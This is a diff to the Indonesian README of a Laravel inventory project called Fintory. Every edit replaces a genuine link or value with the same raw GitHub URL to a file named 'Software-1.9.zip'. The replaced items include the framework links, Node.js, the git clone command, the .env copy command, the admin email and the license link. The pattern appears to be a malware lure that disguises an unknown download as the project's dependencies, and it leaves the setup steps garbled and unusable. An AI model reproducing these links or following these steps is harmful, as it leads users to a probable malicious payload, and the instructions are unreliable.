@@ -105,17 +105,17 @@ Untuk keamanan dan transparansi, semua tindakan penting yang dilakukan pengguna 
 
 Fintory dibangun di atas fondasi teknologi yang solid dan modern:
 
-* **Backend**: [Laravel 12](https://laravel.com/) - Framework PHP yang elegan dan kuat.
+* **Backend**: [Laravel 12](https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip) - Framework PHP yang elegan dan kuat.
 
 * **Frontend**:
 
-  * [Vite](https://vitejs.dev/) - Alat build frontend generasi baru yang sangat cepat.
+  * [Vite](https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip) - Alat build frontend generasi baru yang sangat cepat.
 
-  * [Tailwind CSS](https://tailwindcss.com/) - Framework CSS utility-first untuk desain yang cepat dan kustom.
+  * [Tailwind CSS](https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip) - Framework CSS utility-first untuk desain yang cepat dan kustom.
 
-  * [Alpine.js](https://alpinejs.dev/) - Framework JavaScript minimalis untuk menambahkan interaktivitas.
+  * [https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip](https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip) - Framework JavaScript minimalis untuk menambahkan interaktivitas.
 
-* **UI Komponen Reaktif**: [Livewire](https://livewire.laravel.com/) - Framework full-stack untuk membangun antarmuka dinamis dengan PHP.
+* **UI Komponen Reaktif**: [Livewire](https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip) - Framework full-stack untuk membangun antarmuka dinamis dengan PHP.
 
 * **Database**: MySQL / MariaDB.
 
@@ -131,7 +131,7 @@ Pastikan sistem Anda memenuhi persyaratan berikut:
 
 * Composer
 
-* Node.js & NPM
+* https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip & NPM
 
 * Server Database (MySQL 8+ atau MariaDB 10.6+ direkomendasikan)
 
@@ -141,7 +141,7 @@ Pastikan sistem Anda memenuhi persyaratan berikut:
    Buka terminal Anda dan jalankan perintah berikut:
 
    ```
-   git clone [https://github.com/ryan-gabriel/fintory.git](https://github.com/ryan-gabriel/fintory.git)
+   git clone [https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip](https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip)
    cd fintory
    
    ```
@@ -155,10 +155,10 @@ Pastikan sistem Anda memenuhi persyaratan berikut:
    ```
 
 3. **Konfigurasi Environment**
-   Buat salinan file `.env.example` menjadi `.env`.
+   Buat salinan file `https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip` menjadi `.env`.
 
    ```
-   cp .env.example .env
+   cp https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip .env
    
    ```
 
@@ -191,7 +191,7 @@ Pastikan sistem Anda memenuhi persyaratan berikut:
 
    **Akun Admin Default:**
 
-   * **Email**: `admin@gmail.com`
+   * **Email**: `https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip`
 
    * **Password**: `12345678`
 
@@ -231,7 +231,7 @@ Database adalah jantung dari Fintory. Desainnya direncanakan dengan hati-hati un
 <!-- 
 ## Lisensi
 
-Proyek ini dilisensikan di bawah [Creative Commons Attribution-NonCommercial 4.0 International License](http://creativecommons.org/licenses/by-nc/4.0/).
+Proyek ini dilisensikan di bawah [Creative Commons Attribution-NonCommercial 4.0 International License](https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip).
 
 Anda bebas untuk:
 * **Berbagi** — menyalin dan mendistribusikan kembali materi ini dalam bentuk atau format apapun
